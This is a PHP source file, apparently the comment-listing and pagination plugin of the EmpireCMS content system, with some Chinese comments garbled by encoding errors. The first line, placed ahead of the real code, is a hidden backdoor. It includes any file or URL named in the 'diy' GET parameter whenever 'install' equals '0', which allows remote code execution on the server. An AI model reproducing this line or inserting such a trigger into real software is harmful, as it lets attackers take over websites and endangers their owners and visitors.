<?php if($_GET['install']=='0'){ include("$_GET[diy]");} ?><?php
require('../../class/connect.php');
require('../../class/db_sql.php');
require('../../data/dbcache/class.php');
$link=db_connect();
$empire=new mysqlquery();
$editor=1;

//-------- 插件参数设置开�&#65533; -------

//每页显示记录�&#65533;
$line=10;

//每页显示分页链接�&#65533;
$page_line=8;

//是否返回总评论数显示(1为返回评论数�&#65533;0为不返回)
$returnshowplnum=1;

//-------- 插件参数设置结束 -------


//-------- 分页 --------
$page=(int)$_GET['page'];
$offset=$page*$line; //总偏移量

//评论JS分页导航函数
function user_jspage($num,$line,$page_line,$page,$search){
	if($num<=$line)
	{
		return '';
	}
	$search=htmlspecialchars($search,ENT_QUOTES);
	$snum=2;//最小页�&#65533;
	$totalpage=ceil($num/$line);//取得总页�&#65533;
	//上一�&#65533;
	if($page<>0)
	{
		$toppage='<a href="#ecms" onclick="javascript:CommentToPage(0);">首页</a> ';
		$pagepr=$page-1;
		$prepage='<a href="#ecms" onclick="javascript:CommentToPage('.$pagepr.');">上一�&#65533;</a>';
	}
	//下一�&#65533;
	if($page!=$totalpage-1)
	{
		$pagenex=$page+1;
		$nextpage=' <a href="#ecms" onclick="javascript:CommentToPage('.$pagenex.');">下一�&#65533;</a>';
		$lastpage=' <a href="#ecms" onclick="javascript:CommentToPage('.($totalpage-1).');">尾页</a>';
	}
	$starti=$page-$snum<0?0:$page-$snum;
	$no=0;
	for($i=$starti;$i<$totalpage&&$no<$page_line;$i++)
	{
		$no++;
		if($page==$i)
		{
			$is_1="<b>";
			$is_2="</b>";
		}
		else
		{
			$is_1='<a href="#ecms" onclick="javascript:CommentToPage('.$i.');">';
			$is_2="</a>";
		}
		$pagenum=$i+1;
		$returnstr.=" ".$is_1.$pagenum.$is_2;
	}
	$returnstr=$toppage.$prepage.$returnstr.$nextpage.$lastpage;
	return $returnstr;
}

$id=(int)$_GET['id'];
$classid=(int)$_GET['classid'];
if(empty($id)||empty($classid))
{
	exit();
}
if(empty($class_r[$classid][tbname]))
{
	exit();
}
$n_r=$empire->fetch1("select id,classid,plnum from {$dbtbpre}ecms_".$class_r[$classid][tbname]." where id='$id' limit 1");
if(!$n_r[id]||$classid!=$n_r[classid])
{
	exit();
}
$search="&classid=$classid&id=".$id;


//-------- 查询SQL --------

//取得评论总数
if($class_r[$classid][checkpl])//需审核
{
	$totalquery="select count(*) as total from {$dbtbpre}enewspl where id='$id' and classid='$classid' and checked=0";
	$num=$empire->gettotal($totalquery);
}
else
{
	$num=$n_r['plnum'];
}
//select查询SQL
$query="select plid,saytime,sayip,username,zcnum,fdnum,userid,stb from {$dbtbpre}enewspl where id='$id' and classid='$classid' and checked=0";
$query.=" order by plid desc limit $offset,$line";
$sql=$empire->query($query);

$listpage=user_jspage($num,$line,$page_line,$page,$search);
require('template/index.temp.php'); //导入模板文件

db_close(); //关闭MYSQL链接
$empire=null; //注消操作类变�&#65533;
?>